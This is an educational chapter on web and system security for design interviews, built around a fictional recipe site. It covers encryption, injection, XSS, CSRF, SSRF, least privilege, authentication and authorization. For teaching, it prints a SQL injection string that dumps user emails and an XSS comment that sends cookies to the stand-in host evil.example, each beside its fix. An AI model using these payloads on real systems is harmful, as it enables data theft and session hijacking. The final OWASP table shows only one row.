# Security

This chapter answers seven questions:

- How much security do you need to know for a system design interview?
- How do you protect data while it travels over a network, and while it sits on disk?
- Why is user input dangerous, and how do you stop SQL injection and cross-site scripting?
- What is the principle of least privilege, and how does it limit the damage when something goes wrong?
- How do users and services prove who they are, and how does a system decide what each one may do?
- What do the edge, the API gateway and "zero trust" defend against?
- Which risks does the OWASP Top 10 rank highest today?

Security is a broad topic. Unless you have considerable experience, a security background, or are applying for a position that requires knowledge of security, you probably won't need to know more than the basics in an interview. The basics fit in four rules:

1. **Encrypt data in transit and at rest.** See [Encrypt data in transit and at rest](#encrypt-data-in-transit-and-at-rest).
2. **Sanitize all user input**, and every input parameter a user can reach, to prevent cross-site scripting (XSS) and SQL injection. See [Untrusted input and common web attacks](#untrusted-input-and-common-web-attacks).
3. **Use parameterized queries** to prevent SQL injection. See [SQL injection and parameterized queries](#sql-injection-and-parameterized-queries).
4. **Use the principle of least privilege.** Give each person and each program only the access its job needs. See [The principle of least privilege](#the-principle-of-least-privilege).

The first three sections of this chapter cover those four rules. The later sections go further: how logins and service identities work, how access is decided, what protects the edge of a system, and the current OWASP Top 10. Read them when an interviewer asks about authentication or authorization, or when you design a system that handles money or private data.

We'll keep using **Crumb**, the recipe-sharing site from [Scalability 101](/learn/scalability-101). Crumb has app servers behind a load balancer, login sessions in Redis, a relational database with read replicas, photos in object storage, and workers that resize photos from a queue. Every one of those parts needs protecting.

This chapter builds on [TLS termination](/learn/load-balancing#tls-termination) in Load balancers, [TLS on top of TCP](/learn/protocols-and-apis#tls-on-top-of-tcp) in Network protocols and APIs, and [Reverse proxy, API gateway, and microservices 101](/learn/reverse-proxy-and-api-gateway-101).

## Encrypt data in transit and at rest

Crumb holds data worth stealing: users' email addresses, their password hashes, private recipe drafts, and the session IDs that keep people logged in. That data spends its life in two states:

- **In transit**: moving across a network. Examples are a request from a phone to Crumb's load balancer, or a query from an app server to the database.
- **At rest**: stored on disk. Examples are rows in the database, photos in object storage, and last night's backup.

**Encryption** scrambles data using a secret value called a **key**. Only someone who holds the right key can turn the scrambled form, called **ciphertext**, back into readable data. Data needs encrypting in both states, and each state uses different tools.

### In transit: TLS 1.3

**TLS** (Transport Layer Security) protects data travelling between two endpoints. It gives three guarantees:

- **Confidentiality.** Anyone watching the network sees only ciphertext.
- **Integrity.** If anyone changes the bytes along the way, the receiver detects it.
- **Server authentication.** The client checks the server's certificate, so it knows it reached the real Crumb and not an impostor.

HTTPS is HTTP sent inside a TLS connection. [Network protocols and APIs](/learn/protocols-and-apis#tls-on-top-of-tcp) shows where TLS sits on top of TCP.

**TLS 1.3** ([RFC 8446](https://www.rfc-editor.org/rfc/rfc8446), 2018) is the current version. It improves on TLS 1.2 in two ways.

- **A faster handshake.** The **handshake** is the exchange at the start of a connection where the two sides agree on keys. In TLS 1.3, a full handshake takes one round trip before application data can flow. TLS 1.2 needed two. A client resuming a recent session can even send data in its very first message, a mode called **0-RTT** (zero round trips). An attacker who records that early data can **replay** it, which means sending the same bytes to the server again. So servers should accept 0-RTT data only for requests that are safe to repeat, such as a GET.
- **Only modern cryptography.** TLS 1.3 removed RSA key transport, CBC-mode ciphers, compression and renegotiation. In the RFC's words, "all public-key based key exchange mechanisms now provide forward secrecy." Each handshake creates fresh, temporary keys with a Diffie-Hellman exchange. **Forward secrecy** means that if someone steals the server's long-term private key later, the traffic they recorded earlier still can't be decrypted, because the session keys were never derived from that private key. One exception: a resumed session may skip the fresh exchange and reuse a key from the earlier session, and the RFC notes that this mode gives up forward secrecy for the data it carries.

**Where Crumb uses TLS.** Browsers connect to Crumb's load balancer over TLS. The load balancer decrypts the traffic so it can route each request, a step called [TLS termination](/learn/load-balancing#tls-termination). Behind it, the load balancer opens a new TLS connection to an app server. The app servers use TLS again to reach the database and Redis. Leaving internal traffic unencrypted only works if nobody ever gets onto the private network. The [zero trust](#zero-trust) model, covered later, tells you not to count on that.

### At rest: envelope encryption with a KMS

Encrypting data with a key stored on the same disk, or in the app's config file, protects very little. Whoever steals the data probably gets the key too. Production systems use **envelope encryption**, which separates two kinds of key:

1. **Data encryption key (DEK).** This key encrypts the actual data: a file, a database record or a disk volume. It is typically a 256-bit AES key. Each piece of data, or each customer, can have its own DEK.
2. **Key encryption key (KEK).** This master key lives inside a **key management service (KMS)**, such as AWS KMS, Google Cloud KMS, Azure Key Vault or HashiCorp Vault's transit engine. A KMS is usually backed by hardware security modules (HSMs), which are tamper-resistant devices built to hold keys. The KEK never leaves the KMS. Its only job is to encrypt and decrypt DEKs.

```diagram
title: Envelope encryption with a key management service
[app] Application @ 0,0.5
[kms:store] Key management\nservice (KMS) @ 2,0
[disk:store] Database or\nobject storage @ 2,1
app <-> kms : new data key
app -> disk : ciphertext + wrapped DEK
```

Here is how Crumb writes an encrypted backup:

1. The application asks the KMS for a new data key under a named master key. In AWS KMS this call is `GenerateDataKey`.
2. The KMS returns the DEK twice: once in **plaintext**, and once **wrapped**, meaning encrypted under the KEK.
3. The application encrypts the backup locally with the plaintext DEK. It stores the ciphertext together with the wrapped DEK, and then erases the plaintext DEK from memory.

Here is how it reads the backup back:

4. The application sends the wrapped DEK to the KMS with a `Decrypt` call. The KMS checks that the caller is allowed to use the key, unwraps the DEK with the KEK, and returns the plaintext DEK.
5. The application decrypts the backup locally.

The design has three benefits:

- **Bulk encryption stays local.** The KMS only ever handles 32-byte keys, not gigabytes of data. AWS KMS won't encrypt more than [4,096 bytes](https://docs.aws.amazon.com/kms/latest/APIReference/API_Encrypt.html) directly. Your data never leaves your servers, and the number of KMS requests stays manageable. Applications often cache plaintext DEKs for a short time to cut KMS calls further.
- **Access is controlled and logged in one place.** Every unwrap is a KMS call. The KMS checks each call against its access policy and records it in an audit log, so you can see, and revoke, who can decrypt what.
- **Rotation is cheap.** Rotating a key means replacing it with a new one on a schedule. Managed KMS rotation keeps the old versions of the master key, so existing wrapped DEKs still decrypt and nothing has to be re-encrypted. If you move to a completely new master key, you re-wrap the small DEKs (AWS has a `ReEncrypt` call for this). The data itself stays as it is.

Crumb rarely writes this code itself. Many cloud services can encrypt stored data with a KMS key on your behalf; AWS calls these services ["integrated with AWS KMS"](https://docs.aws.amazon.com/kms/latest/developerguide/concepts.html). Crumb turns that setting on for its database, its backups and its photo storage.

### Secrets management

A **secret** is any value that grants access: a database password, an API key for the payment provider, or a TLS private key. Secrets committed to source code or baked into container images are a common cause of breaches, because they end up in git history, CI logs and image registries. Keep them in a **secrets manager** instead, such as HashiCorp Vault, AWS Secrets Manager or Google Secret Manager. Kubernetes Secrets are only base64-encoded unless you turn on encryption at rest for them, ideally with a KMS provider.

A secrets manager adds three things:

- **Dynamic secrets.** Instead of one database password shared by every app server, Vault can create a separate database login for each server. Each login has a lease that expires after a set time. A leaked credential then stops working on its own, and the logs show which server it belonged to.
- **Rotation.** Long-lived secrets are replaced on a schedule. Applications should fetch secrets at runtime and reload them when they change, so a rotation doesn't need a redeploy.
- **Auditing.** Every read of a secret is logged with the identity of the caller.

## Untrusted input and common web attacks

**Untrusted input** is any data that comes from outside your own servers. For Crumb, that means form fields, URL parameters, headers, cookies, JSON request bodies, uploaded files, and even pages fetched from other websites. An attacker can control every one of these.

Most web attacks follow the same pattern. Untrusted input reaches a place where it is treated as code, such as a SQL query, a web page or a shell command. The attacker then writes input that is also valid code, and the system runs it.

### What "sanitize your input" means

The standard advice is to **sanitize all user input**. That includes every input parameter a user can reach, such as a hidden form field or a URL parameter the page never displays. In practice the advice covers three separate habits:

1. **Validate on the way in.** Check that each input has the expected type, length and format, and reject anything else. A recipe's serving count should be a whole number from 1 to 100. A sort option should be one of `newest`, `rating` or `title`. Checking against a list of allowed values, called an **allowlist**, is safer than trying to list every bad value.
2. **Keep data separate from code.** When input goes into a SQL query, pass it as a query parameter. When it goes into a shell command, pass it as a separate argument. Then the input can't change what the query or command does.
3. **Escape on the way out.** When input is shown in a web page, convert characters that have a special meaning in HTML, such as `<` and `"`, into harmless forms such as `&lt;` and `&quot;`. The browser then displays them as ordinary text.

Validation happens on the server. Checks in the browser make forms friendlier, but an attacker can skip the browser and send any request they like with a tool such as curl.

Validation alone is not enough. The [OWASP Top 10](https://top10.owasp.org/2025/A05_2025-Injection/) describes server-side input validation as "not a complete defense as many applications require special characters." A Crumb recipe's instructions must accept quotes, angle brackets and apostrophes, because real recipes contain them. So validation narrows what reaches the dangerous places, and the second and third habits make those places safe.

### SQL injection and parameterized queries

**SQL injection** happens when untrusted input is pasted into a SQL query, so that the input can change what the query means.

Crumb's recipe list has a cuisine filter, so a URL such as `/recipes?cuisine=thai` shows Thai recipes. Suppose the code builds the query by joining strings:

```js
const sql = "SELECT id, title FROM recipes WHERE cuisine = '" + cuisine + "'";
```

An attacker sends this as the cuisine:

```
thai' UNION SELECT id, email FROM users --
```

The database now receives this query:

```sql
SELECT id, title FROM recipes WHERE cuisine = 'thai' UNION SELECT id, email FROM users --'
```

The attacker's quote mark closed the string early. `UNION` adds the results of a second query, and `--` turns the leftover quote into a comment. The recipe page now lists every user's email address.

The fix is a **parameterized query**, also called a prepared statement. The query text contains a placeholder, and the value travels separately:

```js
const result = await db.query(
  "SELECT id, title FROM recipes WHERE cuisine = $1",
  [cuisine],
);
```

The database reads the structure of the query first and only then receives the value. It treats the value purely as data to compare against the `cuisine` column. Whatever the attacker types, the database looks for a cuisine with that exact name, finds none, and returns an empty list.

OWASP's [SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html) lists prepared statements with parameterized queries as the first defense. An ORM or query builder that uses parameters underneath gives the same protection. Three cases still need care:

- **Table and column names can't be parameters.** If a user picks the sort column, map their choice through an allowlist (for example, `rating` becomes `avg_rating`) and never paste their text into the query.
- **String-building can sneak back in.** It can return inside a stored procedure, or through an ORM's raw-query helper. OWASP's [Top 10 entry on injection](https://top10.owasp.org/2025/A05_2025-Injection/) warns that stored procedures, "even when parameterized," can still be injectable if they join queries and data together.
- **Other interpreters have the same bug.** NoSQL queries, LDAP lookups and shell commands are all injectable. OWASP puts it simply: "The concept is identical among all interpreters." For a shell command, pass the arguments as an array instead of building one command string.

Least privilege adds a second line of defense here. If the recipe-list code connects as a database user that may only read the `recipes` table, the `UNION` attack above fails with a permission error even if the query was built badly. The [least privilege section](#the-principle-of-least-privilege) shows how Crumb sets this up.

### Cross-site scripting (XSS)

**Cross-site scripting (XSS)** happens when an app puts untrusted data into a web page without escaping it. The attacker's data becomes JavaScript that runs in other users' browsers.

Crumb lets people comment on recipes. Suppose someone posts this comment:

```html
Lovely soup! <script>fetch("https://evil.example/?c=" + document.cookie)</script>
```

If Crumb inserts the comment into the page as raw HTML, every visitor's browser runs the script. This version is called **stored XSS**, because the attack is saved in Crumb's database and served to everyone who opens the recipe.

- **Impact.** The script runs as the victim, on Crumb's own site. It can read anything on the page, send requests using the victim's session, and steal any tokens it can reach.
- **Mitigations.**
  - **Escape output for its context.** The rules differ for an HTML body, an HTML attribute, a URL and a block of JavaScript. Modern templating frameworks escape by default. The danger lies in their escape hatches, such as helpers that insert raw HTML. If Crumb wants to let users write bold text and links, it should pass their HTML through a sanitizer library that keeps only an allowlist of safe tags.
  - **Keep session tokens in `HttpOnly` cookies.** Scripts can't read these cookies through `document.cookie`. This limits the damage, though an injected script can still act as the user while the page is open.
  - **Send a strict Content Security Policy (CSP).** A CSP is a response header that tells the browser which scripts it may run. A policy that allows scripts only from your own origin, or only with a random value (a **nonce**) that changes on every response, and that leaves out `'unsafe-inline'`, stops most injected scripts from running.

XSS is common. OWASP's 2025 data counts more than 30,000 published vulnerabilities (CVEs) for XSS and more than 14,000 for SQL injection, and it describes XSS as "high frequency/low impact" and SQL injection as "low frequency/high impact" ([A05:2025 Injection](https://top10.owasp.org/2025/A05_2025-Injection/)).

### Cross-site request forgery (CSRF)

**Cross-site request forgery (CSRF)** tricks a logged-in user's browser into sending a request to your site from another site. For example, a page on another site could contain a hidden form that posts "delete my account" to Crumb. The browser attaches the user's Crumb cookies automatically, so the request looks genuine.

The mitigations:

- **Set `SameSite` on session cookies.** With `SameSite=Lax`, the browser doesn't send the cookie on cross-site POST requests, or on requests that another site embeds (images, iframes, `fetch` calls). It still sends the cookie when the user follows a plain link to your site, so GET requests must never change anything. `SameSite=Strict` withholds the cookie on every cross-site request. That is safer, but users who arrive from a link appear logged out. [MDN](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Set-Cookie) notes that "some browsers use Lax as the default value if SameSite is not specified," so set the attribute explicitly instead of relying on a default.
- **Use anti-CSRF tokens.** The server creates a random value tied to the session, puts it in each form (or the app sends it in a custom header such as `X-CSRF-Token`), and checks it on every request that changes state. Another site can't read the token, so it can't forge the request.
- **Prefer bearer tokens for APIs.** APIs that authenticate with a token in the `Authorization` header aren't exposed to CSRF in the first place, because browsers don't attach that header automatically.

### Server-side request forgery (SSRF)

**Server-side request forgery (SSRF)** happens when a server fetches a URL that a user supplied, and doesn't restrict where that URL can point.

Crumb has an "import a recipe from a link" feature. A user pastes a URL, and a Crumb server downloads the page and extracts the recipe. An attacker pastes an internal address instead.

- **Impact.** The attacker makes your server call things only it can reach. Examples are an admin page at `http://127.0.0.1:8080/admin`, or the cloud metadata service at `http://169.254.169.254/`, which on a misconfigured instance hands out temporary cloud credentials. This was the core of the 2019 Capital One breach, described in the [next section](#a-real-breach-capital-one-2019).
- **Mitigations.**
  - Run URL fetching in an isolated service whose network access is limited to the public internet.
  - Resolve the hostname, then refuse private and special addresses: `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`, loopback `127.0.0.0/8`, link-local `169.254.0.0/16`, and their IPv6 equivalents (`::1`, `fc00::/7`, `fe80::/10`). Connect to the IP address you checked, not to the name. Otherwise a DNS answer that changes between your check and your request, a trick called **DNS rebinding**, gets around the filter. Apply the same check to every redirect.
  - Protect the metadata endpoint itself. On AWS, require **IMDSv2**. It hands out credentials only after a `PUT` request that returns a session token, and by default its response [travels only one network hop](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html). A simple GET forwarded through a vulnerable app can't reach it.

## The principle of least privilege

The **principle of least privilege** says that every user, program and service should have only the permissions it needs to do its job, and nothing more. Jerome Saltzer [stated it in 1974](https://en.wikipedia.org/wiki/Principle_of_least_privilege): "Every program and every privileged user of the system should operate using the least amount of privilege necessary to complete the job."

The principle matters because something will eventually go wrong. A bug slips through review, a password leaks, or an injection attack succeeds. Least privilege limits the **blast radius**, meaning how much damage one compromised part can do.

### Least privilege at Crumb

Here is what each part of Crumb is allowed to do:

| Part | Its job | Access it gets | Access it doesn't get |
|---|---|---|---|
| App servers | Serve pages, save recipes and comments | Read and write on the app's tables, through a database user that can't drop tables or create users | Administrator rights on the database |
| Photo workers | Resize uploaded photos | Read the uploads bucket, write the photos bucket | The database, any other bucket, the backups |
| Weekly reporting job | Count signups and popular recipes | A read-only database user on a read replica | Any writes, and the email and password-hash columns |
| Recipe importer | Fetch pages from other sites | The public internet | Crumb's private network and the cloud metadata service |
| Support staff | Help users with their accounts | View an account, reset two-factor login | Export the whole users table |

```diagram
title: Each Crumb component gets only the access its job needs
[app] App servers @ 0,0
[db:store] Primary database\n(app tables) @ 2.5,0
[w] Photo workers @ 0,1
[ph:store] Photos bucket\n(write only here) @ 2.5,1
[r] Reporting job @ 0,2
[rep:store] Read replica\n(read-only user) @ 2.5,2
app -> db : read and write
w -> ph : write photos
r -> rep : read selected columns
```

Two of these deserve a closer look.

**The photo worker can write only to the photos bucket.** Photo workers open image files that strangers upload. If a malicious file exploits a bug in the image library, the attacker gets whatever the worker's credentials allow. On AWS, the worker's policy might look like this:

```json
{
  "Version": "2012-10-17",
  "Statement": [
    { "Effect": "Allow", "Action": "s3:GetObject", "Resource": "arn:aws:s3:::crumb-uploads/*" },
    { "Effect": "Allow", "Action": "s3:PutObject", "Resource": "arn:aws:s3:::crumb-photos/*" }
  ]
}
```

Anything the policy doesn't allow is denied. So a hijacked worker can read uploads and write photos, and it can't touch the database, the backups or any other bucket.

**The reporting job uses a read-only database user.** The weekly report only needs to count rows. In PostgreSQL, Crumb creates a user for it and grants only what the report reads:

```sql
CREATE ROLE reporting LOGIN PASSWORD '...';
GRANT CONNECT ON DATABASE crumb TO reporting;
GRANT USAGE ON SCHEMA public TO reporting;
GRANT SELECT ON recipes, ratings TO reporting;
GRANT SELECT (id, created_at, country) ON users TO reporting;
```

If the report's password leaks, the attacker can read recipe and rating data. They can't change or delete anything, and they can't read email addresses or password hashes. Pointing the job at a [read replica](/learn/relational-databases#primary-replica-replication) also keeps a heavy report from slowing down the primary database.

### Putting it into practice

- **Start from nothing and add.** OWASP's [SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html) advises: "Start from the ground up to determine what access rights your application accounts require, rather than trying to figure out what access rights you need to take away." It also says, in capitals, never to give application accounts administrator access.
- **Give each component its own identity.** If the app servers, workers and reporting job share one database user or one cloud role, they can't have different permissions, and the logs can't tell you which one did something.
- **Deny by default.** The [OWASP Top 10](https://top10.owasp.org/2025/A01_2025-Broken_Access_Control/) lists violating least privilege, "commonly known as deny by default," as the first example of broken access control.
- **Prefer short-lived credentials.** The [dynamic secrets](#secrets-management) described earlier expire on their own, so a leaked one is useful for hours at most.
- **Apply it to people too.** Engineers get production access only when a task needs it, and it is removed afterwards.

### A real breach: Capital One, 2019

In 2019, a former Amazon employee was arrested and charged with stealing more than 100 million credit applications from Capital One. [KrebsOnSecurity's account](https://krebsonsecurity.com/2019/08/what-we-can-learn-from-the-capital-one-hack/), based on interviews with security experts including a source with knowledge of the investigation, describes two failures that combined:

1. **SSRF.** A misconfigured web application firewall in Capital One's AWS environment could be tricked into relaying requests to the metadata service. That service handed out the firewall's temporary cloud credentials.
2. **Too much privilege.** According to Krebs, the firewall "was assigned too many permissions, i.e. it was allowed to list all of the files in any buckets of data, and to read the contents of each of those files."

A firewall's job doesn't require reading customer files. With least privilege applied, the SSRF bug would have given the attacker credentials that could do very little.

## Authentication: who is calling?

**Authentication** answers the question *who is making this request?* A distributed system has two kinds of caller: people using a browser or a mobile app, and services calling other services. The two are usually handled differently.

### Storing passwords

When someone signs up to Crumb with an email and password, Crumb must never store the password itself. It stores a **hash** instead. A hash is the output of a one-way function: easy to compute from the password, and impossible to reverse. At login, Crumb hashes the password the user typed and compares the result with the stored hash. OWASP's [Password Storage Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html) explains why this is safer: "Even if an attacker obtains the hashed password, they cannot use it to log in as the victim."

Use an algorithm designed for passwords. General-purpose hashes such as SHA-256 are built to be fast, which helps an attacker who wants to test guesses against a stolen hash. Password hashes are deliberately slow and memory-hungry. The cheat sheet recommends Argon2id with at least 19 MiB of memory, an iteration count of 2 and a parallelism of 1. Its fallbacks are scrypt, and bcrypt with a work factor of 10 or more for older systems.

Each hash also includes a **salt**, a random value stored next to it. Two users with the same password then get different hashes, so an attacker can't crack them both at once. The cheat sheet notes that most password-hashing libraries "automatically generate and manage salts internally."

### Sessions vs tokens

After a successful login, the system needs a way to recognize the user on later requests. HTTP doesn't remember anything between requests, so the server gives the client something to send with every request that proves it already logged in. There are two common designs.

| | Server-side session | Self-contained token (JWT) |
|---|---|---|
| **What the client holds** | A random session ID with no meaning of its own, usually in a cookie. | A signed token that carries the user's ID, expiry time and other facts. |
| **What the server stores** | The session record (user ID, expiry and so on) in Redis or a database. | Nothing per user. It needs only the key to check signatures. |
| **Checking a request** | Look the session ID up in the store. | Verify the signature with a public key or shared secret, then check the expiry. |
| **Logging someone out** | Delete the session record. It takes effect on the next request. | Hard. The token stays valid until it expires, unless servers check a revocation list, which brings back a lookup. |
| **Size** | Small: a random ID of about 32 characters. | Hundreds of bytes or more, because the facts are encoded JSON. |
| **Good fit** | First-party web apps, where instant logout and account bans matter. | APIs called by many services or across domains, where a shared session store is awkward. |

Crumb's website uses server-side sessions stored in Redis, as set up in [Scalability 101](/learn/scalability-101). Its mobile app and public API use tokens.

A **JWT** (JSON Web Token) has three parts separated by dots, each base64url-encoded:

1. A **header** that says which algorithm signed the token.
2. A **payload** of **claims**, which are facts about the user and the token. Common claims are `sub` (the user's ID), `exp` (the expiry time) and `aud` (the audience, meaning the service the token is meant for).
3. A **signature** that proves the issuer created the token and nobody changed it.

The payload is only encoded, so anyone holding the token can decode and read it. Never put secrets in a JWT.

Most production systems combine the two designs:

- A **short-lived access token**, valid for 5 to 15 minutes, that APIs check without any lookup.
- A **long-lived refresh token**, valid for days or weeks, that is stored and checked on the server.

When the access token expires, the client sends the refresh token to the **authorization server**, the service that issues tokens. That server checks that the account is still active and that the refresh token hasn't been revoked, then issues a new access token. Many servers also **rotate** the refresh token, issuing a new one on each use. If an old refresh token is ever used again, the server treats it as a sign of theft.

```diagram
title: Short-lived access tokens with revocable refresh tokens
[client:client] Client @ 0,0.5
[gw] API gateway @ 1.8,0
[auth] Auth server @ 1.8,1.2
[api] Resource API @ 3.6,0
[db:store] Token store @ 3.6,1.2
client -> gw : access token
gw -> api : verified request
client <-> auth : refresh token
auth -> db : revoked?
```

With this setup, a banned account keeps access for at most one access-token lifetime, which is a few minutes. Ordinary requests never touch the token store.

### Federated identity: OAuth 2.0 and OpenID Connect

Most systems don't want every component handling passwords. They hand that job to a dedicated **identity provider**, such as Google or a company's own login service. Two standards cover this, and they are often confused.

- **OAuth 2.0** is a framework for **delegated authorization**. It lets an application get limited access to a user's data on another service without ever seeing the user's password. For example, a photo-printing site could read your photos from a cloud photo service. You approve the request on the provider's site. The application then gets an **access token** limited to certain **scopes**, such as "read photos", and uses it to call the provider's API. OAuth 2.0 on its own doesn't tell the application who you are.
- **OpenID Connect (OIDC)** is an identity layer on top of OAuth 2.0 that adds **authentication**. Along with the access token, the provider returns an **ID token**. This is a signed JWT with claims about the login: `iss` (who issued it), `sub` (a stable user ID), `aud` (which application it's for), `exp`, and optionally profile claims such as `email`. When Crumb offers "Sign in with Google", it is using OIDC. The ID token is meant for the application that requested it, so the application can learn who logged in. APIs take access tokens, and an ID token should never be sent to one.

For browser and mobile apps, the recommended flow is the **authorization code flow with PKCE** (Proof Key for Code Exchange, [RFC 7636](https://www.rfc-editor.org/rfc/rfc7636)). It works in four steps:

1. The app generates a random secret, the `code_verifier`, and computes `code_challenge = BASE64URL(SHA-256(code_verifier))`.
2. It sends the user to the provider's login page along with the `code_challenge`.
3. After the user logs in and approves, the provider redirects back to the app with a short-lived **authorization code**.
4. The app exchanges the code for tokens and sends the original `code_verifier` with it. The provider hashes the verifier and checks that it matches the challenge from step 2.

Someone who intercepts the code in step 3 can't use it, because they don't have the verifier. The current OAuth security best practice, [RFC 9700](https://www.rfc-editor.org/rfc/rfc9700), says public clients such as browser and mobile apps "MUST use PKCE" and recommends it for all other clients. It also says clients "SHOULD NOT use the implicit grant", an older flow that returned tokens directly in the redirect URL.

### Service-to-service identity: mutual TLS

Inside a private network or a Kubernetes cluster, services also need to know who is calling them. Trusting a request because it comes from an internal IP address is weak. An attacker who takes over one container can then call anything, and internal IP addresses change constantly anyway.

Say Crumb adds a billing service for its paid plan, and only the app servers should be able to call it. In ordinary TLS, only the server proves its identity. With **mutual TLS (mTLS)**, both sides prove their identity during the TLS handshake:

1. The app server connects to the billing service. Billing sends its certificate, as in normal TLS. (A **certificate** is a signed document, in the X.509 format, that ties a name to a public key.)
2. Billing asks for a client certificate, and the app server sends its own.
3. Each side checks that the other's certificate is signed by a trusted internal **certificate authority (CA)** and hasn't expired. Each also proves it holds the private key that matches its certificate, by signing part of the handshake.
4. Both sides derive fresh session keys, and the rest of the connection is encrypted.

Billing now knows exactly which service is calling, and can apply a rule such as "only the app servers may call billing". Managing certificates by hand for hundreds of services doesn't work, so in practice a **service mesh** does it. Each service runs next to a small proxy called a **sidecar**. The sidecar gets a short-lived certificate that encodes the service's identity, often as a SPIFFE ID such as `spiffe://cluster.local/ns/shop/sa/checkout`. It renews the certificate automatically and handles the handshake. The application itself speaks plain HTTP to its local sidecar. See [the service mesh and sidecar proxies](/learn/reverse-proxy-and-api-gateway-101#the-service-mesh-and-sidecar-proxies).

## Authorization: what may the caller do?

Once the system knows who the caller is, **authorization** answers the next question: *may this caller do this action on this resource?*

Getting this wrong is the most common serious flaw in web applications. OWASP's 2025 Top 10 ranks [broken access control](https://top10.owasp.org/2025/A01_2025-Broken_Access_Control/) first, and reports that "100% of the applications tested were found to have some form of broken access control." A typical example is an edit page at `/recipes/812/edit`. If Crumb checks only that the user is logged in, any user can edit recipe 812 by typing its number into the address bar. The server must check, on every request, that the logged-in user is allowed to edit that particular recipe. OWASP calls this flaw an **insecure direct object reference**.

### Role-based access control (RBAC)

**Role-based access control (RBAC)** grants permissions to named **roles** and then gives roles to users. On Crumb, a `moderator` role might get `comments:hide` and `recipes:feature`, and an `admin` role might also get `users:ban`.

RBAC is simple to build and easy to audit. "Who can ban users?" is a single lookup. It struggles once rules depend on context:

- A moderator can hide comments. Should a moderator for Italian recipes also hide comments on Thai recipes?
- Should they be able to do it only from a company laptop?

Encoding each of these as a separate role leads to **role explosion**: hundreds of roles like `moderator_italian_eu_weekdays` that nobody can keep track of.

### Attribute-based access control (ABAC)

**Attribute-based access control (ABAC)** decides using **policies** written over attributes. The attributes usually fall into four groups:

- **Subject**: who is asking (user ID, department, role, clearance).
- **Action**: what they want to do (read, write, delete, approve).
- **Resource**: what they want to do it to (document ID, owner, department, classification).
- **Environment**: the context of the request (time, network, the health of the device).

A policy might say: *allow users in the Finance department to edit Budget documents whose region matches the user's region, from a managed device.* One rule like that replaces dozens of roles. The cost is that "who can access this document?" becomes harder to answer, because the answer depends on attributes at the moment of the request.

In practice the two models mix, and a role becomes one attribute among many. Some rules depend on relationships, such as "users can edit recipe collections that were shared with them". Many systems handle those with **relationship-based access control (ReBAC)**, which checks a graph of who owns what and who shared what with whom. Google's [Zanzibar paper](https://research.google/pubs/zanzibar-googles-consistent-global-authorization-system/) describes the best-known example.

### Where the decision is made: PEP and PDP

```diagram
title: A policy enforcement point asks a policy decision point
[client:client] Request @ 0,0
[pep] API gateway\n(PEP) @ 1.5,0
[pdp] Policy engine\n(PDP, e.g. OPA) @ 1.5,1
[api] Resource\nservice @ 3,0
client -> pep : action on resource
pep <-> pdp : allowed?
pep -> api : only if allowed
```

Larger systems split the work into two roles. The names come from the XACML standard.

- The **policy enforcement point (PEP)** sits in the request path, at the gateway, in a sidecar, or inside the service. It collects the attributes, asks for a decision, and then allows or blocks the request.
- The **policy decision point (PDP)** evaluates the policies and returns a decision, typically allow or deny, sometimes with extra conditions. Open Policy Agent (OPA) is a common general-purpose PDP. Its policies are written in a language called Rego and kept in version control like code.

Keeping policy in one engine means rules are written once, tested, and changed without redeploying every service. A PDP usually runs next to the PEP, as a sidecar or a library, so a decision doesn't add a network round trip to every request.

## Defending the edge and the network

The guiding principle here is **defense in depth**. You put independent controls at each layer (the edge, the network, the application and the data), so that one control failing doesn't expose everything. If the firewall misses an injection, the parameterized query still stops it. If an attacker steals a database backup, it is encrypted with a key they can't reach.

### Edge, WAF and API gateway

Before traffic reaches Crumb's app servers, it passes through several layers. Each layer stops a different kind of attack.

1. **DDoS protection at the edge.** A **distributed denial-of-service (DDoS)** attack floods a site with traffic from many machines until it can't serve real users. CDN and edge providers (Cloudflare, Amazon CloudFront with AWS Shield, Fastly, Akamai) absorb large floods at the network level, such as UDP floods and SYN floods. Their capacity is spread across many locations by Anycast, so a flood is split up long before it reaches you. See [DNS and CDN 101](/learn/dns-and-cdn-101#anycast-routing-one-address-many-places).
2. **Web application firewall (WAF).** A WAF inspects HTTP requests and blocks known attack patterns: SQL injection strings, cross-site scripting payloads, exploit signatures such as Log4Shell, and malformed requests. A WAF only catches patterns it already knows, so the application still has to be safe on its own. A WAF is also software with its own permissions, and the [Capital One breach](#a-real-breach-capital-one-2019) shows it needs least privilege like any other component.
3. **API gateway.** The gateway enforces [rate limits](/learn/rate-limiting) per IP address, API key or user, which slows down password-guessing and scraping. It also authenticates callers, rejects requests that don't match the API's schema, caps body sizes, and strips headers that clients aren't allowed to set, such as internal identity headers. See [Central authentication](/learn/reverse-proxy-and-api-gateway-101#central-authentication).

### Zero trust

The older model of network security was **castle and moat**: everything outside the firewall is untrusted, and everything inside is trusted. Its weakness is that one compromised laptop or container puts the attacker inside, with access to everything.

**Zero trust**, described in [NIST SP 800-207](https://csrc.nist.gov/pubs/sp/800/207/final), assumes the attacker may already be inside:

- Being on the internal network grants nothing. Every request is authenticated and authorized, including calls between services, which is where mTLS comes in.
- Access follows [least privilege](#the-principle-of-least-privilege): each user and service gets only the permissions its job needs, so one compromised credential has a small blast radius.
- Decisions can use context such as the health of the device, and they are made for each request instead of once per login.

Zero trust also depends on knowing what happened. Logs of logins, access denials and KMS calls only help if someone is alerted when they look wrong. [Monitoring, logging and tracing](/learn/observability#alerting-on-symptoms) covers alerting.

## The OWASP Top 10

**OWASP** (the Open Worldwide Application Security Project) is a [nonprofit foundation](https://owasp.org/about/) "that works to improve the security of software." Its **Top 10** is, in its own words, "a standard awareness document for developers and web application security" that "represents a broad consensus about the most critical security risks to web applications." The current edition is the [OWASP Top 10:2025](https://top10.owasp.org/2025/), the eighth since the list began.

| Rank | Category | What it means | Where this chapter covers it |
|---|---|---|---|
| A01 | Broken Access Control | Users can act outside their intended permissions. The category includes CSRF, and since 2025 it also includes SSRF. | [Authorization](#authorization-what-may-the-caller-do), [Least privilege](#the-principle-of-least-privilege), [SSRF](#server-side-request-forgery-ssrf), [CSRF](#cross-site-request-forgery-csrf) |
